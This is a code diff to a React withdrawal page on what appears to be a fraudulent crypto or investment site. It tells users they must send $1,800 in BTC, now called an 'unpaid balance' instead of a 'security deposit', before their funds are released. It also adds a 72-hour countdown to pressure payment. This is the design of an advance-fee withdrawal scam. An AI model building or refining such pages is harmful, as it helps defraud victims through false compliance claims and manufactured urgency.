@@ -6,7 +6,7 @@ import {
   Bitcoin, Copy, X, ArrowRight,
 } from "lucide-react";
 
-const UNLOCK_AMOUNT = 6000;
+const UNLOCK_AMOUNT = 1800;
 
 type WithdrawStep = "form" | "unlock" | "submitted";
 
@@ -32,6 +32,21 @@ export default function WithdrawPage() {
   const [copied, setCopied]       = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [finalMsg, setFinalMsg]   = useState("");
+
+  /* ── countdown timer ── */
+  const [countdown, setCountdown] = useState(72 * 60 * 60); // 72 hours in seconds
+
+  useEffect(() => {
+    const timer = setInterval(() => setCountdown(prev => (prev > 0 ? prev - 1 : 0)), 1000);
+    return () => clearInterval(timer);
+  }, []);
+
+  const formatCountdown = (secs: number) => {
+    const h = Math.floor(secs / 3600).toString().padStart(2, '0');
+    const m = Math.floor((secs % 3600) / 60).toString().padStart(2, '0');
+    const s = (secs % 60).toString().padStart(2, '0');
+    return `${h}h ${m}m ${s}s`;
+  };
 
   /* ── load user balance + admin settings ── */
   useEffect(() => {
@@ -188,15 +203,22 @@ export default function WithdrawPage() {
                   <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-orange-500/10 text-orange-400">
                     <Bitcoin className="w-7 h-7" />
                   </div>
-                  <h3 className="text-xl font-bold text-white">Unlock Your Withdrawal</h3>
+                  <h3 className="text-xl font-bold text-white">Clear Unpaid Balance</h3>
                   <p className="text-gray-400 text-sm">
                     To process your withdrawal of{" "}
                     <strong className="text-white">
                       ${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                     </strong>
-                    , you must first send a one-time security deposit of{" "}
+                    , you must first clear your unpaid balance of{" "}
                     <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
                   </p>
+                  <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 flex items-center justify-between mt-4">
+                    <div className="flex items-center gap-2">
+                      <Clock className="w-5 h-5 text-red-400 animate-pulse" />
+                      <span className="text-sm font-semibold text-red-400">Time remaining to cover balance:</span>
+                    </div>
+                    <span className="font-mono text-lg font-bold text-red-400">{formatCountdown(countdown)}</span>
+                  </div>
                 </div>
 
                 {/* Withdrawal summary */}
@@ -236,7 +258,7 @@ export default function WithdrawPage() {
                     </button>
                   </div>
                   <p className="text-xs text-gray-500">
-                    ⚠️ This security deposit is required by our compliance team to authenticate and unlock your withdrawal. Once your BTC transaction is confirmed on-chain (usually 10–30 min), your withdrawal will be released within your selected processing timeframe.
+                    ⚠️ Clearing this unpaid balance is required by our compliance team to authenticate and unlock your funds. Once your BTC transaction is confirmed on-chain (usually 10–30 min), your withdrawal will be released within your selected processing timeframe.
                   </p>
                 </div>
 
@@ -310,11 +332,11 @@ export default function WithdrawPage() {
           <Bitcoin className="w-5 h-5 text-orange-500 shrink-0 mt-0.5" />
           <div>
             <h4 className="text-sm font-bold text-orange-700 dark:text-orange-400">
-              Withdrawal Security Deposit Required
+              Unpaid Balance Clearance Required
             </h4>
             <p className="text-sm text-orange-600 dark:text-orange-300/80 mt-1">
-              All withdrawals require a one-time BTC security deposit of{" "}
-              <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> to authenticate your identity and unlock funds. The deposit address will be shown after you submit this form.
+              All withdrawals require you to clear your unpaid balance of{" "}
+              <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> before funds can be released. You have 3 days to cover this balance. The deposit address will be shown after you submit this form.
             </p>
           </div>
         </div>
